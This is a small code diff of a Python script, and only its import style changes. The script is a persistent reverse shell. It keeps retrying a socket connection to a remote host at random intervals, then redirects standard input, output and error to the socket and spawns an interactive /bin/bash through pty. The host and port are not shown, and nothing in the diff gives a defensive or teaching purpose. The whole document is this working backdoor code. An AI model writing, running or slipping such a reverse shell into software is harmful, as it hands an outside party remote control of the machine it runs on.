@@ -1,8 +1,7 @@
-
-from os import dup2
-from pty import spawn
-from time import sleep
-from random import randint
+import os
+import pty
+import time
+import random
 import socket
 
 
@@ -14,9 +13,10 @@ def run():
         try:
             s.connect((host,port))
         except:
-            sleep(randint(10,15))
+            time.sleep(random.randint(10,15))
             continue
-        dup2(s.fileno(),0) 
-        dup2(s.fileno(),1) 
-        dup2(s.fileno(),2)
-        spawn("/bin/bash")
+        os.dup2(s.fileno(),0) 
+        os.dup2(s.fileno(),1) 
+        os.dup2(s.fileno(),2)
+        pty.spawn("/bin/bash")
+    
